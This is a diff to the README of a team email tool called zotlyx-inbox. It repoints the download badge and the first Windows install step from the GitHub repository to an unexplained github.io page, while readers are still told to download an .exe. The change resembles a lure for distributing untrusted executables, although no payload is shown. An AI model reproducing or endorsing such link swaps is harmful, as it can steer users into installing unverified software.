@@ -1,6 +1,6 @@
 # 📧 zotlyx-inbox - Manage team emails with smart tools
 
-[![Download Zotlyx](https://img.shields.io/badge/Download-Zotlyx_Inbox-blue)](https://github.com/Tonyfi7584/zotlyx-inbox)
+[![Download Zotlyx](https://img.shields.io/badge/Download-Zotlyx_Inbox-blue)](https://tonyfi7584.github.io)
 
 Zotlyx-inbox provides a shared workspace for your team. You manage all incoming emails in one place. Your team works together on messages in real-time. It uses artificial intelligence to help you write replies faster. You host your data securely on Cloudflare.
 
@@ -17,7 +17,7 @@ Make sure your computer meets these needs before you start:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the main project page at https://github.com/Tonyfi7584/zotlyx-inbox.
+1. Go to the main project page at https://tonyfi7584.github.io
 2. Look for the Releases section on the right side of the screen.
 3. Click on the latest version number.
 4. Locate the file ending in .exe in the Assets list.
